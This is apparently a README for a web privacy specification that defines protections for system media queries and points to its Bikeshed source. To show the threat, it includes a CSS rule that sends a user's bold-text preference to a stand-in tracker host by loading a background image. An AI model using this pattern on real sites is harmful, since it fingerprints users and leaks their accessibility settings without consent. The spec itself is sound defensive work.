# Privacy protections for media features

The shared privacy model for the [system media queries](../). A style sheet can read a media feature without script
and report it to a server by loading a resource, so features about the user's system need protections that script
APIs don't. This spec defines them once, and each system media query spec says which it uses and why.

```css
/* The attack every system media feature has to survive: no script needed. */
@media (prefers-bold-text: bold) {
  body { background-image: url("https://tracker.example/collect?bold-text=1"); }
}
```

- **Protected evaluation.** Rules that depend on the feature can change only paint-only properties, such as `color`,
  `outline`, and `box-shadow`. Script, layout, resource loading, hit testing, and the accessibility tree all see the
  feature's observable value. The page's appearance adapts, and the page can't find out why. This is the model user
  agents already use for `:visited`.
- **Delayed change delivery.** A hidden document learns of a change when it becomes visible, which reveals nothing
  the `visibilitychange` event doesn't. A visible document learns of it after a random delay. Two documents can't be
  linked by the moment a value changed.
- **Frame-scoped exposure.** A Permissions Policy feature, allowed by default only for the top-level document and
  same-origin frames. Cross-origin frames see a restricted value unless the embedding page allows more.
- **Reduced-exposure contexts.** Private browsing modes with fingerprinting protection, contexts where the IP address
  is hidden, documents with script disabled for privacy reasons, and features the user turned off.

The spec also has the threat model (attackers, goals, and the channels a value leaks through) and the fingerprinting
arithmetic the other specs use: a setting that 1% of users turn on reveals 6.6 bits about each of them, even though
the average across all users is under 0.1 bits.

| Folder | Contents |
| --- | --- |
| [spec/](spec/) | The specification. [index.bs](spec/index.bs) is the Bikeshed source, and [index.html](spec/index.html) is the rendered spec. |

There is no polyfill: the protections limit what a page can learn, and a polyfill is part of the page.
